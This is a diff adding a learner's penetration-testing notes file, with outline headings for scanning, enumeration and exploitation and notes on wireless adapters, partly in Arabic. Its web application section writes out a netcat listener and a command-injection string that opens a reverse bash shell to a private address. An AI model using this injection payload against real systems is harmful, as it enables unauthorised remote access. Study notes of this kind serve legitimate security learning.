@@ -1,0 +1,43 @@
+# My Network Information
+# Live Hosts
+# Port Scanning
+# Port By Port ==> Cheat sheet
+- 139 && 445 (smb)
+- 21 (ftp)
+- 80 (http)
+- 443 (https)
+- 22 (ssh)
+- 23 (telnet)
+- others
+# Advanced nmap scanning
+# Enumeration
+# Exploitation
+# Post Exploitation
+=================================
+# Web Application
+	- SQL
+	- RCE
+	nc -nlvp 4444
+	google.com; nc -nv 192.168.2.12 4444 -e /bin/bash ------------> هنا بعد ال ; دة كوماند انجيكت هيتنفذ عشان يخليني استخدم اكواد الباش 
+طبعا دي جلسة استماع باستخدام ال نيتكات	
+	- File Upload
+=================================
+# Wireless Adapter
+	- Packet Injection && Monitor Mode
+	- Chipset الرقائق
+	- atheros ar9271
+
+	- tp-link tl-wn722n v1 ==> مستعملة
+	- alfa awus036nha
+	- tp-link tl-wn722n v2 or v3 ==> حيلة ==> kali 2021 
+
+	- settings ==> usb ==> +
+	- lsusb
+=================================
+# Setup Android Device
+	- 
+
+
+
+
+
